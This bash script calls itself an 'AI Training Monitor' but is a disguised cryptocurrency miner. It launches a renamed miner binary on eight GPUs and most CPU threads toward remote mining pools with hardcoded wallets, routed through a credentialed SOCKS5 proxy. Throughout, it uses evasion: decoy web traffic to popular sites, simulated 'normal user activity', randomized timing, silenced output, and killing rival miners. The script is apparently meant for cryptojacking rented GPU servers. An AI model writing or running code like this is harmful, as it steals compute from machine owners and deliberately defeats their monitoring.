#!/bin/bash

# Set TERM variable and locale for consistent output
export TERM=xterm
export LC_ALL=C

# Function to calculate CPU threads (total - 4)
calculate_cpu_threads() {
    local total_threads=$(nproc --all)
    local threads=$((total_threads - 4))
    
    # Ensure minimum of 1 thread
    if [ $threads -lt 1 ]; then
        threads=1
    fi
    
    echo $threads
}

# Proxy configuration (SOCKS5)
PROXY_IP="212.236.136.0"
PROXY_PORT="12324"
PROXY_USER="14af5aea05bc3"
PROXY_PASS="4907cda305"
PROXY_STRING="${PROXY_USER}:${PROXY_PASS}@${PROXY_IP}:${PROXY_PORT}"

# Calculate CPU threads
CPU_THREADS=$(calculate_cpu_threads)
echo "Detected $(nproc --all) CPU threads, using $CPU_THREADS threads (total - 4)"

# Function to print CPU and GPU usage (improved and fixed)
print_usage() {
    # Get CPU usage percentage - using mpstat if available, otherwise simpler method
    local cpu_usage=0
    
    if command -v mpstat &> /dev/null; then
        # Use mpstat for accurate CPU usage
        cpu_usage=$(mpstat 1 1 | tail -1 | awk '{print 100 - $12}')
        cpu_usage=${cpu_usage%.*}  # Convert decimal to integer
    else
        # Fallback method using /proc/stat
        local cpu_line=$(grep '^cpu ' /proc/stat)
        local idle=$(echo $cpu_line | awk '{print $5}')
        local total=0
        
        for val in $cpu_line; do
            total=$((total + val))
        done
        
        # Simple calculation (not perfect but works)
        if [ $prev_total -gt 0 ]; then
            local diff_total=$((total - prev_total))
            local diff_idle=$((idle - prev_idle))
            if [ $diff_total -gt 0 ]; then
                cpu_usage=$((100 - (100 * diff_idle / diff_total)))
            fi
        fi
        
        prev_total=$total
        prev_idle=$idle
    fi
    
    # Get GPU usage percentage
    local gpu_usage=0
    local gpu_count=0
    
    if command -v nvidia-smi &> /dev/null; then
        # Get GPU usage for all GPUs
        while read -r line; do
            # Extract number (handle both integer and decimal)
            local usage=$(echo "$line" | grep -o '[0-9]*\.\?[0-9]*' | head -1)
            usage=${usage%.*}  # Remove decimal part
            if [[ $usage =~ ^[0-9]+$ ]] && [ $usage -ge 0 ] && [ $usage -le 100 ]; then
                gpu_usage=$((gpu_usage + usage))
                gpu_count=$((gpu_count + 1))
            fi
        done < <(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null)
        
        if [ $gpu_count -gt 0 ]; then
            local avg_gpu_usage=$((gpu_usage / gpu_count))
            printf "\rCPU: %3d%% | GPU: %3d%% | Threads: %2d | Time: %s" "$cpu_usage" "$avg_gpu_usage" "$CPU_THREADS" "$(date +%H:%M:%S)"
        else
            printf "\rCPU: %3d%% | GPU: N/A  | Threads: %2d | Time: %s" "$cpu_usage" "$CPU_THREADS" "$(date +%H:%M:%S)"
        fi
    else
        printf "\rCPU: %3d%% | GPU: N/A  | Threads: %2d | Time: %s" "$cpu_usage" "$CPU_THREADS" "$(date +%H:%M:%S)"
    fi
}

# Initialize CPU usage variables
prev_total=0
prev_idle=0

# Function to randomize sleep times
random_sleep() {
    local min=$1
    local max=$2
    local random_duration=$((RANDOM % (max - min + 1) + min))
    sleep $random_duration
}

# Function to create random traffic noise
generate_noise_traffic() {
    local noise_urls=(
        "https://www.google.com"
        "https://www.youtube.com"
        "https://www.github.com"
        "https://www.stackoverflow.com"
        "https://www.wikipedia.org"
    )
    
    local random_url=${noise_urls[$RANDOM % ${#noise_urls[@]}]}
    
    curl -s -m 2 --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" --proxy-user "${PROXY_USER}:${PROXY_PASS}" "$random_url" > /dev/null 2>&1 &
}

# Function to test proxy connection
test_proxy_connection() {
    echo "Testing proxy connection..."
    local test_url="https://api.ipify.org"
    
    if command -v curl &> /dev/null; then
        local proxy_test=$(timeout 10 curl -s --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" --proxy-user "${PROXY_USER}:${PROXY_PASS}" "$test_url")
        
        if [ -n "$proxy_test" ]; then
            echo "✓ Proxy connection successful (IP: $proxy_test)"
            return 0
        else
            echo "✗ Proxy connection failed"
            return 1
        fi
    else
        echo "curl not found, skipping proxy test"
        return 0
    fi
}

# Function to start mining processes
start_mining() {
    # Clean old processes
    pkill -f aitraining_dual 2>/dev/null || true
    pkill -f srbminer-multi 2>/dev/null || true
    random_sleep 1 3
    
    # Generate some noise traffic before starting
    generate_noise_traffic
    
    echo "Starting GPU miner with SOCKS5 proxy..."
    
    # Start GPU process with proxy (using KawPow algorithm)
    nohup ./aitraining_dual \
        --algorithm kawpow \
        --pool stratum+ssl://51.89.99.172:16161 \
        --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
        --worker H200-g \
        --password x \
        --gpu-id 0,1,2,3,4,5,6,7 \
        --tls true \
        --disable-cpu \
        --api-disable \
        --proxy "${PROXY_STRING}" \
        > /dev/null 2>&1 &
    GPU_PID=$!

    # Random delay before CPU process
    random_sleep 2 5
    
    echo "Starting CPU miner with SOCKS5 proxy ($CPU_THREADS threads)..."
    
    # Start CPU process with proxy (using RandomX algorithm)
    nohup ./aitraining_dual \
        --algorithm randomx \
        --pool stratum+ssl://51.222.200.133:10343 \
        --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
        --worker H200-c \
        --password x \
        --cpu-threads $CPU_THREADS \
        --cpu-threads-priority 2 \
        --disable-gpu \
        --tls true \
        --api-disable \
        --proxy "${PROXY_STRING}" \
        > /dev/null 2>&1 &
    CPU_PID=$!

    echo "Processes started at $(date '+%H:%M:%S')"
    echo "GPU PID: $GPU_PID, CPU PID: $CPU_PID"
    
    # Give processes time to start
    sleep 5
}

# Function to stop mining processes
stop_mining() {
    generate_noise_traffic
    
    echo -e "\nStopping processes at $(date '+%H:%M:%S')..."
    
    kill $GPU_PID 2>/dev/null || true
    kill $CPU_PID 2>/dev/null || true
    
    wait $GPU_PID 2>/dev/null || true
    wait $CPU_PID 2>/dev/null || true
    
    pkill -f aitraining_dual 2>/dev/null || true
    pkill -f srbminer-multi 2>/dev/null || true
    
    random_sleep 1 3
    clear
}

# Function to simulate normal user activity
simulate_normal_activity() {
    if [ $((RANDOM % 5)) -eq 0 ]; then
        echo " [Simulating normal user activity...]"
        ls -la > /dev/null 2>&1
        date > /dev/null 2>&1
        df -h > /dev/null 2>&1
        generate_noise_traffic
    fi
}

# Function to optimize CPU mining parameters
optimize_cpu_mining() {
    local total_mem_kb=$(grep MemTotal /proc/meminfo | awk '{print $2}')
    local total_mem_gb=$((total_mem_kb / 1024 / 1024))
    
    echo "System memory: ${total_mem_gb}GB"
    
    # For RandomX, check if huge pages are configured
    if [ -f /proc/sys/vm/nr_hugepages ]; then
        local hugepages=$(cat /proc/sys/vm/nr_hugepages)
        if [ $hugepages -lt 1280 ]; then
            echo "Note: For optimal RandomX performance, consider increasing huge pages"
            echo "Run as root: echo 1280 > /proc/sys/vm/nr_hugepages"
        fi
    fi
}

# Main execution
clear
echo "=== AI Training Monitor ==="
echo "CPU Threads: $(nproc --all) total, using $CPU_THREADS for mining"
echo "Proxy: ${PROXY_USER}@${PROXY_IP}:${PROXY_PORT}"
echo "=============================================="

# Test proxy connection
if ! test_proxy_connection; then
    echo "Warning: Proxy connection test failed!"
    echo "Continuing anyway, but mining may not work..."
    read -p "Press Enter to continue or Ctrl+C to abort..."
fi

# Optimize CPU mining
optimize_cpu_mining

echo -e "\nProcesses run for 1 hour, then pause 1 minute"
echo "Press Ctrl+C to stop"
echo "=============================================="

# Main loop
while true; do
    start_mining
    
    start_time=$(date +%s)
    run_duration=$((3600 + (RANDOM % 600) - 300))
    
    while true; do
        current_time=$(date +%s)
        elapsed=$((current_time - start_time))
        
        if [ $elapsed -ge $run_duration ]; then
            break
        fi
        
        print_usage
        
        if [ $((RANDOM % 60)) -eq 0 ]; then
            simulate_normal_activity
        fi
        
        random_sleep 1 4
    done
    
    stop_mining
    
    pause_duration=$((60 + (RANDOM % 40) - 20))
    
    echo -e "\nSystem cooling down for $pause_duration seconds..."
    
    for ((i=pause_duration; i>0; i--)); do
        if [ $((i % 10)) -eq 0 ] || [ $i -lt 10 ]; then
            printf "\rResuming in: %02d seconds" "$i"
        fi
        sleep 1
    done
    
    echo -e "\nResuming monitoring..."
    echo "=============================================="
done
